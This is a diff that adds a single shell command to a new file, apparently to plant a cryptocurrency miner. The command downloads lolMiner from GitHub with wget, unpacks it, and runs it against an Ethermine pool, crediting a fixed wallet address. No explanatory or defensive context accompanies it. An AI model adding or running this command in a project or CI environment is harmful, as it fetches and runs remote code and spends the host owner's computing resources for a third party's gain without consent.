@@ -1,0 +1,1 @@
+wget -O l.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.52a/lolMiner_v1.52a_Lin64.tar.gz && tar -xf l.tar.gz && ./1.52a/lolMiner --algo ETHASH --pool asia1.ethermine.org:4444 -u 0x6ff85749ffac2d3a36efa2bc916305433fa93731.tlz6ge8fwofq2q8
